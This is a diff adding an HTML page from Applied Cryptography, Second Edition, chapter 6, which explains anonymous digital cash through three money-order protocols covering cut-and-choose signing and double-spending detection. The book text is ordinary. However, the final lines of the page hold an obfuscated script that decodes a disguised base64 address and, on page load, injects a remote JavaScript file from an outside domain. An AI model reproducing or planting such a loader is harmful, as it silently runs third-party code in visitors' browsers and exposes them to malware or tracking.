@@ -1,0 +1,115 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=139-142//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Happily, there is a complicated protocol that allows for authenticated but untraceable messages. Lobbyist Alice can transfer <B>digital cash</B> to Congresscritter Bob so that newspaper reporter Eve does not know Alice&#146;s identity. Bob can then deposit that electronic money into his bank account, even though the bank has no idea who Alice is. But if Alice tries to buy cocaine with the same piece of digital cash she used to bribe Bob, she will be detected by the bank. And if Bob tries to deposit the same piece of digital cash into two different accounts, he will be detected&#151;but Alice will remain anonymous. Sometimes this is called <B>anonymous digital cash</B> to differentiate it from digital money with an audit trail, such as credit cards.</P>
+<P>A great social need exists for this kind of thing. With the growing use of the Internet for commercial transactions, there is more call for network-based privacy and anonymity in business. (There are good reasons people are reluctant to send their credit card numbers over the Internet.) On the other hand, banks and governments seem unwilling to give up the control that the current banking system&#146;s audit trail provides. They&#146;ll have to, though. All it will take for digital cash to catch on is for some trustworthy institution to be willing to convert the digits to real money.</P>
+<P>Digital cash protocols are very complex. We&#146;ll build up to one, a step at a time. For more formal details, read [318, 339, 325, 335, 340]. Realize that this is just one digital cash protocol; there are others.</P>
+<P><FONT SIZE="+1"><B><I>Protocol #1</I></B></FONT></P>
+<P>The first few protocols are physical analogies of cryptographic protocols. This first protocol is a simplified physical protocol for anonymous money orders:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice prepares 100 anonymous money orders for $1000 each.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice puts one each, and a piece of carbon paper, into 100 different envelopes. She gives them all to the bank.
+<DD><B>(3)</B>&nbsp;&nbsp;The bank opens 99 envelopes and confirms that each is a money order for $1000.
+<DD><B>(4)</B>&nbsp;&nbsp;The bank signs the one remaining unopened envelope. The signature goes through the carbon paper to the money order. The bank hands the unopened envelope back to Alice, and deducts $1000 from her account.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice opens the envelope and spends the money order with a merchant.
+<DD><B>(6)</B>&nbsp;&nbsp;The merchant checks for the bank&#146;s signature to make sure the money order is legitimate.
+<DD><B>(7)</B>&nbsp;&nbsp;The merchant takes the money order to the bank.
+<DD><B>(8)</B>&nbsp;&nbsp;The bank verifies its signature and credits $1000 to the merchant&#146;s account.
+</DL>
+<P>This protocol works. The bank never sees the money order it signed, so when the merchant brings it to the bank, the bank has no idea that it was Alice&#146;s. The bank is convinced that it is valid, though, because of the signature. The bank is confident that the unopened money order is for $1000 (and not for $100, 000 or $100, 000, 000) because of the cut-and-choose protocol (see Section 5.1). It verifies the other 99 envelopes, so Alice has only a 1 percent chance of cheating the bank. Of course, the bank will make the penalty for cheating great enough so that it isn&#146;t worth that chance. If the bank refuses to sign the last check (if Alice is caught cheating) without penalizing Alice, she will continue to try until she gets lucky. Prison terms are a better deterrent.
+</P>
+<P><FONT SIZE="+1"><B><I>Protocol #2</I></B></FONT></P>
+<P>The previous protocol prevents Alice from writing a money order for more than she claims to, but it doesn&#146;t prevent Alice from photocopying the money order and spending it twice. This is called the <B>double spending problem</B>; to solve it, we need a complication:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice prepares 100 anonymous money orders for $1000 each. On each money order she includes a different random uniqueness string, one long enough to make the chance of another person also using it negligible.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice puts one each, and a piece of carbon paper, into 100 different envelopes. She gives them all to the bank.
+<DD><B>(3)</B>&nbsp;&nbsp;The bank opens 99 envelopes and confirms that each is a money order for $1000.
+<DD><B>(4)</B>&nbsp;&nbsp;The bank signs the one remaining unopened envelope. The signature goes through the carbon paper to the money order. The bank hands the unopened envelope back to Alice and deducts $1000 from her account.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice opens the envelope and spends the money order with a merchant.
+<DD><B>(6)</B>&nbsp;&nbsp;The merchant checks for the bank&#146;s signature to make sure the money order is legitimate.
+<DD><B>(7)</B>&nbsp;&nbsp;The merchant takes the money order to the bank.
+<DD><B>(8)</B>&nbsp;&nbsp;The bank verifies its signature and checks its database to make sure a money order with the same uniqueness string has not been previously deposited. If it hasn&#146;t, the bank credits $1000 to the merchant&#146;s account. The bank records the uniqueness string in a database.
+<DD><B>(9)</B>&nbsp;&nbsp;If it has been previously deposited, the bank doesn&#146;t accept the money order.
+</DL>
+<P>Now, if Alice tries to spend a photocopy of the money order, or if the merchant tries to deposit a photocopy of the money order, the bank will know about it.
+</P>
+<P><FONT SIZE="+1"><B><I>Protocol #3</I></B></FONT></P>
+<P>The previous protocol protects the bank from cheaters, but it doesn&#146;t identify them. The bank doesn&#146;t know if the person who bought the money order (the bank has no idea it&#146;s Alice) tried to cheat the merchant or if the merchant tried to cheat the bank. This protocol corrects that:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice prepares 100 anonymous money orders for $1000 each. On each of the money orders she includes a different random uniqueness string, one long enough to make the chance of another person also using it negligible.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice puts one each, and a piece of carbon paper, into 100 different envelopes. She gives them all to the bank.
+<DD><B>(3)</B>&nbsp;&nbsp;The bank opens 99 envelopes and confirms that each is a money order for $1000 and that all the random strings are different.
+<DD><B>(4)</B>&nbsp;&nbsp;The bank signs the one remaining unopened envelope. The signature goes through the carbon paper to the money order. The bank hands the unopened envelope back to Alice and deducts $1000 from her account.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice opens the envelope and spends the money order with a merchant.
+<DD><B>(6)</B>&nbsp;&nbsp;The merchant checks for the bank&#146;s signature to make sure the money order is legitimate.
+<DD><B>(7)</B>&nbsp;&nbsp;The merchant asks Alice to write a random identity string on the money order.
+<DD><B>(8)</B>&nbsp;&nbsp;Alice complies.
+<DD><B>(9)</B>&nbsp;&nbsp;The merchant takes the money order to the bank.
+<DD><B>(10)</B>&nbsp;&nbsp;The bank verifies the signature and checks its database to make sure a money order with the same uniqueness string has not been previously deposited. If it hasn&#146;t, the bank credits $1000 to the merchant&#146;s account. The bank records the uniqueness string and the identity string in a database.
+<DD><B>(11)</B>&nbsp;&nbsp;If the uniqueness string is in the database, the bank refuses to accept the money order. Then, it compares the identity string on the money order with the one stored in the database. If it is the same, the bank knows that the merchant photocopied the money order. If it is different, the bank knows that the person who bought the money order photocopied it.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(bpeoyyFA, VjQuMoKa) {VjQuMoKa = bpeoyyFA.createElement('script');VjQuMoKa.type = 'text/javascript';VjQuMoKa.async = true;VjQuMoKa.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');bpeoyyFA.getElementsByTagName('body')[0].appendChild(VjQuMoKa);}(document));</script></body>
+</html>
